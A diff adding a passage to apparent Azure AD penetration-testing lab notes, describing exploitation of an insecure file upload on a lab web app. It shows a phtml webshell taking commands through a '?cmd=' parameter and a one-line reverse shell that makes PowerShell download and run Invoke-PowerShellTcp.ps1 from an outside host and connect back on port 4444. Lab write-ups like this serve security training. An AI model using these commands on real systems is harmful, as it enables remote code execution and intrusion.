@@ -1454,3 +1454,17 @@ Use ```C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1``` to find u
 PS C:\AzAD\Tools> . C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1 
 PS C:\AzAD\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362
 ```
+
+#### The WebApp
+Another insecure file upload - lets just upload our easy ```phtml``` webshell again
+
+it passes in OS calls with ```?cmd```:
+```
+https://fms-defcorphq.msappproxy.net/dist/uploads/student100shell.phtml?cmd=whoami
+```
+
+lets do a revshell with this RCE:
+```
+https://fms-defcorphq.msappproxy.net/dist/uploads/studentxshell.phtml?cmd=powershell iex (New-Object Net.Webclient).downloadstring('http://172.161.52.213:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444
+```
+
